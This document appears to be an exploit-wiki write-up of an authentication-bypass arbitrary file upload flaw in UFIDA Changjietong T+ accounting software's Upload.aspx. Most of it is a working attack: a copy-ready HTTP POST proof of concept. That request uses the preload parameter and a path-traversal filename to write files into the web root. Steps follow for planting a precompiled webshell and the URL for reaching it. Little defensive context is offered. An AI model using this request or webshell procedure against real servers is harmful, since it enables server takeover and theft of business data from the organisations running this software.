# UFIDA Changjietong T+ Upload.aspx Any file upload vulnerability

## Vulnerability Description

There is a vulnerability to upload any file in UFIDA Changjietong T+ Upload.aspx interface. The attacker bypasses authentication through the preload parameter to upload files to control the server.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">UFIDA Changjietong T+</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1662017510454-8bb328d0-35ee-42f9-a36a-625e95a5cfc2-2353804.png)

The vulnerable interface is ` /tplus/SM/SetupAccount/Upload.aspx`, corresponding file `App_Web_upload.aspx.9475d17f.dll`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1662034256298-447ab241-2def-46e0-a97d-9dae60549044.png)

The upload file type verification is incomplete. You can upload any file to any location in the server to verify the POC.

```html
POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
Host:
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 261
User-Agent: Mozilla/5.0 (iPod; U; CPU iPhone OS 3_0 like Mac OS X; ko-KR) AppleWebKit/535.16.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B117 Safari/6535.16.4
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVXR9biLu
Connection: close

------WebKitFormBoundaryVXR9biLu
Content-Disposition: form-data; name="File1";filename="../../../../../../../Program Files (x86)/Chanjet/TPlusStd/WebSite/1.txt"
Content-Type: image/jpeg

1
------WebKitFormBoundaryVXR9biLu--
```

Since the application is precompiled, the directly uploaded `aspx Trojan` cannot be directly used. You need to use the Webshell after uploading the `dll and compiled` files.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1662034644623-835164ab-e259-41ab-9999-2a5ef462a462.png)

Upload the `dll and compiled` files to the bin directory of the web application, and upload aspx to the web root directory

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1662037558563-ffb9835f-fc57-4d45-bc08-dfdf5cb2892d.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1662037573454-3bc3ef0c-3ff2-46b6-b90a-ef3c72150be2.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1662037605211-d44eed98-a1e1-4bac-85be-bb2909844f68.png)

Then access the written Webshell to connect

```html
/tplus/shell.aspx?preload=1	
```